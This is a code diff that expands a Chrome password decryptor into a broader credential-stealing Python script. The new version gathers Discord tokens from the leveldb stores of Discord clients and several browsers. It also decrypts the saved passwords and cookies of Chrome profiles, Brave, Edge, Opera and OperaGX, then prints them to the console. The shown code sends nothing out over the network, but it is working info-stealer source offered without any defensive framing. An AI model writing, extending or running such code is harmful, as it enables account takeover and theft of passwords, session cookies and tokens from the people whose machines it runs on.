@@ -1,77 +1,205 @@
 import os
-import json
-import base64
-import sqlite3
-import shutil
+import re
+from base64 import b64decode
+from json import loads
+from sqlite3 import connect
+
 import win32crypt
 from Cryptodome.Cipher import AES
-from datetime import datetime, timedelta
 
-# Step 1: Get paths
-local_state_path = os.path.join(
-    os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State")
-login_data_path = os.path.join(
-    os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\Login Data")
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
 
-# Step 2: Get AES key from Local State
-with open(local_state_path, "r", encoding="utf-8") as f:
-    local_state = json.load(f)
-encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
-encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # remove 'DPAPI' prefix
+tokenPaths = {
+    'Discord': f"{roaming}\\Discord",
+    'Discord Canary': f"{roaming}\\discordcanary",
+    'Discord PTB': f"{roaming}\\discordptb",
+    'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
+    'Opera': f"{roaming}\\Opera Software\\Opera Stable",
+    'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
+    'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
+}
 
-# Decrypt with DPAPI
-decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+browser_loc = {
+    "Chrome": f"{local}\\Google\\Chrome",
+    "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
+    "Edge": f"{local}\\Microsoft\\Edge",
+    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
+    "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
+}
 
-# Step 3: Copy DB (Chrome locks it while running)
-tmp_db = "Loginvault.db"
-shutil.copy2(login_data_path, tmp_db)
+# CHROME PROFILES
+for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
+    if i.startswith("Profile "):
+        browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"
 
-# Step 4: Open DB and decrypt passwords
-conn = sqlite3.connect(tmp_db)
-cursor = conn.cursor()
-
-cursor.execute("""
-SELECT origin_url, username_value, password_value, date_created
-FROM logins
-""")
-
-def decrypt_password(buff, key):
+# DISCORD TOKENS
+def decrypt_token(buff, master_key):
     try:
-        if buff.startswith(b'v10') or buff.startswith(b'v11'):
-            iv = buff[3:15]
-            payload = buff[15:-16]
-            tag = buff[-16:]
-            cipher = AES.new(key, AES.MODE_GCM, iv)
-            decrypted = cipher.decrypt_and_verify(payload, tag)
-            return decrypted.decode('utf-8')
+        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
+                       buff[3:15]).decrypt(buff[15:])[:-16].decode()
+    except:
+        pass
+
+
+def get_tokens(path):
+    cleaned = []
+    tokens = []
+    done = []
+    lev_db = f"{path}\\Local Storage\\leveldb\\"
+    loc_state = f"{path}\\Local State"
+    # new method with encryption
+    if os.path.exists(loc_state):
+        with open(loc_state, "r") as file:
+            key = loads(file.read())['os_crypt']['encrypted_key']
+        for file in os.listdir(lev_db):
+            if not file.endswith(".ldb") and file.endswith(".log"):
+                continue
+            else:
+                try:
+                    with open(lev_db + file, "r", errors='ignore') as files:
+                        for x in files.readlines():
+                            x.strip()
+                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                tokens.append(values)
+                except PermissionError:
+                    continue
+        for i in tokens:
+            if i.endswith("\\"):
+                i = i.replace("\\", "")
+            if i not in cleaned:
+                cleaned.append(i)
+        for token in cleaned:
+            decrypted = decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
+            if decrypted:
+                done.append(decrypted)
+
+    else:  # old method without encryption
+        for file_name in os.listdir(path):
+            try:
+                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                    continue
+                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        for token in re.findall(regex, line):
+                            done.append(token)
+            except:
+                continue
+
+    return done
+
+
+# DECRYPT CIPHERS
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+
+# DECRYPT BROWSER
+def decrypt_browser(LocalState, LoginData, CookiesFile, name):
+    if os.path.exists(LocalState):
+        with open(LocalState) as f:
+            local_state = f.read()
+            local_state = loads(local_state)
+        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+        if os.path.exists(LoginData):
+            with connect(LoginData) as conn:
+                cur = conn.cursor()
+                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                print(f"\n*** {name} Passwords ***")
+                for logins in cur.fetchall():
+                    try:
+                        if not logins[0] or not logins[1] or not logins[2]:
+                            continue
+                        ciphers = logins[2]
+                        init_vector = ciphers[3:15]
+                        enc_pass = ciphers[15:-16]
+
+                        cipher = generate_cipher(master_key, init_vector)
+                        dec_pass = decrypt_payload(cipher, enc_pass).decode()
+                        print(f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n")
+                    except Exception:
+                        pass
         else:
-            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
-    except Exception as e:
-        return f"[Decryption failed] {e}"
+            print(f"{name} Login Data file missing")
 
-print("\n🟢 Decrypted Chrome Passwords:\n")
-
-for row in cursor.fetchall():
-    origin_url = row[0]
-    username = row[1]
-    encrypted_password = row[2]
-    created = row[3]
-
-    if not username and not encrypted_password:
-        continue
-
-    password = decrypt_password(encrypted_password, decrypted_key)
-
-    if created:
-        created_time = datetime(1601, 1, 1) + timedelta(microseconds=created)
-        created_str = created_time.strftime("%Y-%m-%d %H:%M:%S")
+        if os.path.exists(CookiesFile):
+            with connect(CookiesFile) as conn:
+                curr = conn.cursor()
+                curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
+                print(f"\n*** {name} Cookies ***")
+                for cookies in curr.fetchall():
+                    try:
+                        if not cookies[0] or not cookies[1] or not cookies[2]:
+                            continue
+                        if "google" in cookies[0]:
+                            continue
+                        ciphers = cookies[2]
+                        init_vector = ciphers[3:15]
+                        enc_pass = ciphers[15:-16]
+                        cipher = generate_cipher(master_key, init_vector)
+                        dec_pass = decrypt_payload(cipher, enc_pass).decode()
+                        print(f"URL : {cookies[0]}\nName: {cookies[1]}\nCook: {dec_pass}\n")
+                    except Exception:
+                        pass
+        else:
+            print(f"No {name} Cookie file")
     else:
-        created_str = "N/A"
+        print(f"{name} Local State file missing")
 
-    print(f"🔹 URL: {origin_url}")
-    print(f"   Username: {username}")
-    print(f"   Password: {password}")
-    print(f"   Created: {created_str}\n")
 
-conn.close()
-os.remove(tmp_db)
+def Local_State(path):
+    return f"{path}\\User Data\\Local State"
+
+
+def Login_Data(path):
+    if "Profile" in path:
+        return f"{path}\\Login Data"
+    else:
+        return f"{path}\\User Data\\Default\\Login Data"
+
+
+def Cookies(path):
+    if "Profile" in path:
+        return f"{path}\\Network\\Cookies"
+    else:
+        return f"{path}\\User Data\\Default\\Network\\Cookies"
+
+
+def main_tokens():
+    for platform, path in tokenPaths.items():
+        if not os.path.exists(path):
+            continue
+        try:
+            tokens = set(get_tokens(path))
+        except:
+            continue
+        if not tokens:
+            continue
+        print(f"\n*** {platform} Tokens ***")
+        for i in tokens:
+            print(i)
+
+
+def decrypt_files(path, browser):
+    if os.path.exists(path):
+        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)
+    else:
+        print(f"{browser} not installed")
+
+
+def main():
+    for name, path in browser_loc.items():
+        decrypt_files(path, name)
+    main_tokens()
+
+
+if __name__ == "__main__":
+    main()
